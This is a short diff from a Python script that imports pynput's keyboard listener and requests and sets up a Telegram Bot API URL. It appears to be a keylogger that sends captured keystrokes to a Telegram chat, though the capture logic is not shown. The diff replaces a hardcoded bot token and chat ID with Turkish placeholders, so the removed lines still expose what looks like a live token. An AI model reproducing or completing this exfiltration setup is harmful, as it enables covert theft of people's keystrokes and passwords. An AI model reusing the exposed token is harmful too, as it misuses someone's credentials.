@@ -2,8 +2,8 @@ from pynput import keyboard
 import threading
 import requests 
 
-TOKEN = "7863276235:AAGyqJTAf7pjvi-ntckOjfB5PgH6XEAA_yA" 
-CHAT_ID = "7559907272"
+TOKEN = "BOT TOKENİNİZ" 
+CHAT_ID = "CHAT_IDNİZ"
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
 
 
